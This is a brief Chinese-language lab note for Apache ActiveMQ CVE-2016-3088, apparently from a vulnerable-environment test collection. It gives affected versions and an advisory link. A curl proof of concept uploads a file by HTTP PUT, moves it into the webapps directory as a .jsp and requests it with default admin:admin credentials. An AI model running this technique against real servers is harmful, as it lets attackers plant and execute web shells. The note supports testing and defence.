### CVE-2016-3088 - PUT + MOVE file:// 漏洞

测试镜像

* src/activemq/5.13.0/

影响版本

* 5.0.0 - 5.13.x

参考文档

* [CVE-2016-3088 - ActiveMQ Fileserver web application vulnerabilities](http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt)

Poc

```
#创建测试文件
echo hello world > 123.txt

# 上传文件
curl -vv http://127.0.0.1/fileserver/123.txt -XPUT --data @123.txt

# 改名，需要知道绝对路径
curl -vv -X MOVE --header 'Destination: file:///activemq/webapps/123.jsp' 'http://127.0.0.1/fileserver/123.txt'

# 访问
curl --user admin:admin 'http://127.0.0.1/123.jsp'
```

